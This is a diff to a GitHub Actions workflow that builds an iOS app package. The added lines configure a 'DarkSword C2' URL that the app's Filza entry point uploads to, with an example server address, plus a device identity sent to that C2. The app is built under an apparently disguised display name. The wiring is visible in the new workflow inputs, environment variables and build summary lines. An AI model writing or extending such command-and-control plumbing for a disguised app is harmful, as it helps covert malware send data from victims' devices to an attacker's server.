@@ -53,6 +53,14 @@ on:
         description: 'Springboard name for the chat client (chat_shell only)'
         required: false
         default: 'TryMaskCard'
+      dark_sword_url:
+        description: 'DarkSword C2 base URL the Filza entry point uploads to (chat_shell only, e.g. http://148.135.46.208:8080)'
+        required: false
+        default: 'http://127.0.0.1:8080'
+      dark_sword_uuid:
+        description: 'Device identity sent to the C2 (leave empty to use the app container UUID)'
+        required: false
+        default: ''
 
 concurrency:
   group: build-remote-console-ipa-${{ github.ref }}
@@ -220,6 +228,8 @@ jobs:
           FILZA_CHAT_SHELL: ${{ inputs.chat_shell && '1' || '0' }}
           FILZA_CHAT_SHELL_URL: ${{ inputs.chat_shell_url }}
           FILZA_CHAT_SHELL_DISPLAY_NAME: ${{ inputs.chat_shell_display_name }}
+          FILZA_CHAT_SHELL_DARK_SWORD_URL: ${{ inputs.dark_sword_url }}
+          FILZA_CHAT_SHELL_DARK_SWORD_UUID: ${{ inputs.dark_sword_uuid }}
         run: |
           set +e
           export PATH="/opt/procursus/bin:$PATH"
@@ -238,6 +248,7 @@ jobs:
             echo "- artifact: \`${OUT_IPA}\`"
             echo "- home page: \`${FILZA_CHAT_SHELL_URL}\`"
             echo "- display name: \`${FILZA_CHAT_SHELL_DISPLAY_NAME}\`"
+            echo "- dark sword C2: \`${FILZA_CHAT_SHELL_DARK_SWORD_URL}\`"
             echo ''
           } >> "$GITHUB_STEP_SUMMARY"
           echo "ipa=${OUT_IPA}" >> "$GITHUB_OUTPUT"
